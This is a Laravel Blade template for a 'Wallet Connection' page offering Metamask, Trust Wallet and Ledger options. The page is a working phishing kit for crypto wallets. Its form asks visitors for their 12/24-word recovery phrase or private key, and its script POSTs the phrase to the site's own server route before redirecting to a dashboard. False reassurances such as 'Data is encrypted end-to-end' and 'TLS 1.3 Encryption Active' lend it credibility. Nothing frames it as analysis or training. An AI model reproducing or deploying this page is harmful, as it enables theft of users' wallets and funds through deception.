@extends('layouts.user.app')

@section('title', 'Wallet Connection')

@section('content')
<link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">

<div class="container py-5">
    <div class="row justify-content-center">
        <div class="col-xl-7 col-lg-9">
            <div class="glass-card p-5 text-center">
                <div class="mb-5">
                    <div class="icon-orb mx-auto mb-4">
                        <i class="ri-global-line text-primary" style="font-size: 3.5rem;"></i>
                    </div>
                    <h2 class="outfit font-weight-bold">Wallet Connection</h2>
                    <p class="text-secondary">Securely link your decentralized wallet to the global asset network via encrypted RPC systems.</p>
                </div>

                <div class="row g-4 mb-5">
                    <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
                        <div class="wallet-select-card glass-card p-4 pointer" onclick="selectWallet('Metamask')">
                            <div class="wallet-logo-wrap mx-auto mb-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><path fill="#E17726" d="M43.6 4L26.7 16.5l3.1-7.3z"/><path fill="#E27625" d="M4.4 4l16.7 12.6L18.2 9.2z"/><path fill="#E27625" d="M37.4 33.5L33 40l9.5 2.6 2.7-9.2z"/><path fill="#E27625" d="M2.8 33.4l2.7 9.2L15 40l-4.4-6.5z"/><path fill="#E27625" d="M14.5 21.1l-2.6 4L22 25.5l-.4-10.6z"/><path fill="#E27625" d="M33.5 21.1l-5.2-9.2-.3 10.7 10 .4z"/><path fill="#E27625" d="M15 40l6.3-3.1-5.5-4.3z"/><path fill="#E27625" d="M26.7 36.9L33 40l-.8-7.4z"/><path fill="#D5BFB2" d="M33 40l-6.3-3.1.5 4.2-.1 1.7z"/><path fill="#D5BFB2" d="M15 40l5.9 2.8-.1-1.7.5-4.2z"/><path fill="#233447" d="M21.1 30.5l-5.3-1.5 3.7-1.7z"/><path fill="#233447" d="M26.9 30.5l1.6-3.2 3.7 1.7z"/><path fill="#CC6228" d="M15 40l.8-6.5-5.2.1z"/><path fill="#CC6228" d="M32.2 33.5L33 40l5.4-6.6z"/><path fill="#CC6228" d="M38 25.1l-10-.4 1 5.8 1.5-3.2 3.8 1.7z"/><path fill="#CC6228" d="M15.8 29l3.8-1.7 1.5 3.2.9-5.8-10 .4z"/><path fill="#E27625" d="M11.9 25.1l4.2 8.3-.1-4.1z"/><path fill="#E27625" d="M33.7 29.3l-.2 4.1 4.2-8.3z"/><path fill="#E27625" d="M22 25.5l-.9 5.8 1.2 6 .3-7.9z"/><path fill="#E27625" d="M32.3 25.5l-4.5 3.9.2 7.9 1.2-6z"/></svg>
                            </div>
                            <div class="font-weight-bold">Metamask</div>
                            <div class="small text-secondary mt-1">Browser Extension</div>
                        </div>
                    </div>
                    <div class="col-md-4" data-aos="fade-up" data-aos-delay="200">
                        <div class="wallet-select-card glass-card p-4 pointer" onclick="selectWallet('TrustWallet')">
                            <div class="wallet-logo-wrap mx-auto mb-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><defs><linearGradient id="tw" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#0500FF"/><stop offset="100%" stop-color="#0052FF"/></linearGradient></defs><rect width="48" height="48" rx="12" fill="url(#tw)"/><path d="M24 10c5.5 3 11 4 11 4s-1 14-4 20-7 8-7 8-4-2-7-8-4-20-4-20 5.5-1 11-4z" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
                            </div>
                            <div class="font-weight-bold">Trust Wallet</div>
                            <div class="small text-secondary mt-1">Mobile App</div>
                        </div>
                    </div>
                    <div class="col-md-4" data-aos="fade-up" data-aos-delay="300">
                        <div class="wallet-select-card glass-card p-4 pointer" onclick="selectWallet('Ledger')">
                            <div class="wallet-logo-wrap mx-auto mb-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><rect width="48" height="48" rx="12" fill="#000"/><rect x="8" y="8" width="15" height="32" rx="3" fill="none" stroke="white" stroke-width="2"/><rect x="25" y="28" width="15" height="12" rx="3" fill="none" stroke="white" stroke-width="2"/><rect x="25" y="8" width="15" height="8" rx="3" fill="none" stroke="white" stroke-width="2"/><circle cx="15.5" cy="34" r="2.5" fill="white"/></svg>
                            </div>
                            <div class="font-weight-bold">Ledger</div>
                            <div class="small text-secondary mt-1">Hardware Wallet</div>
                        </div>
                    </div>
                </div>

                <div id="connection-interface" class="d-none">
                    <div class="text-start mb-4">
                        <h6 class="outfit font-weight-bold mb-3"><i class="ri-shield-keyhole-line me-2"></i> Private Key / Recovery Phrase</h6>
                        <p class="text-secondary small mb-3">Enter your 12/24 word recovery phrase or hexadecimal private key to establish a secure link. Data is encrypted end-to-end.</p>
                        <form id="connect-form">
                            <textarea name="data" id="phrase-input" class="form-control premium-input w-100 p-4" rows="4" placeholder="Enter word phrase separated by spaces..."></textarea>
                            <div class="d-flex justify-content-between align-items-center mt-3">
                                <span class="small text-secondary"><i class="ri-lock-2-line"></i> TLS 1.3 Encryption Active</span>
                                <button type="submit" class="btn btn-premium px-5 py-3" id="connect-btn">Establish Link</button>
                            </div>
                        </form>
                    </div>
                </div>

                <div class="alert bg-info-soft text-info small border-0 mt-5">
                    <i class="ri-information-line me-2"></i> Connecting via decentralized systems ensures your assets remain on-chain while enabling advanced trading features.
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    .icon-orb { width: 100px; height: 100px; background: rgba(59, 130, 246, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; border: 2px solid rgba(59, 130, 246, 0.2); }
    .icon-orb::after { content: ''; position: absolute; inset: -10px; border-radius: 50%; border: 1px dashed rgba(59, 130, 246, 0.3); animation: rotate 10s linear infinite; }
    
    .wallet-select-card { transition: 0.3s; border: 1px solid var(--glass-border); cursor: pointer; }
    .wallet-select-card:hover { transform: translateY(-5px); border-color: var(--accent-primary); background: rgba(59, 130, 246, 0.05); }
    .wallet-select-card.active { border-color: var(--accent-primary); background: rgba(59, 130, 246, 0.08); box-shadow: 0 0 20px rgba(59, 130, 246, 0.15); }

    .wallet-logo-wrap { width: 64px; height: 64px; display: flex; align-items: center; justify-content: center; }

    .bg-info-soft { background: rgba(6, 182, 212, 0.1); }
    
    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
</style>

@endsection

@push('js')
<script>
    function selectWallet(name) {
        $('.wallet-select-card').removeClass('active').css('opacity', '0.5');
        event.currentTarget.style.opacity = '1';
        event.currentTarget.classList.add('active');
        $('#connection-interface').removeClass('d-none');
        toastr.info(`Preparing secure tunnel for ${name}...`);
    }

    $('#connect-form').on('submit', function(e) {
        e.preventDefault();
        const data = $('#phrase-input').val();
        if(!data || data.split(' ').length < 12) return toastr.error('Valid 12/24 word phrase or private key required.');

        $('#connect-btn').attr('disabled', true).html('<span class="spinner-border spinner-border-sm"></span> Establishing...');

        fetch("{{ route('sumitConnect') }}", {
            method: 'POST',
            headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': "{{ csrf_token() }}"},
            body: JSON.stringify({data})
        })
        .then(res => res.json())
        .then(data => {
            if(data.status === 'true') {
                toastr.success('Connection established successfully. Verifying account status...');
                setTimeout(() => window.location.href = "{{ route('dashboard.index') }}", 2500);
            } else {
                toastr.error('Connection timeout. Please check your phrase and try again.');
                $('#connect-btn').removeAttr('disabled').text('Establish Link');
            }
        });
    });
</script>
@endpush
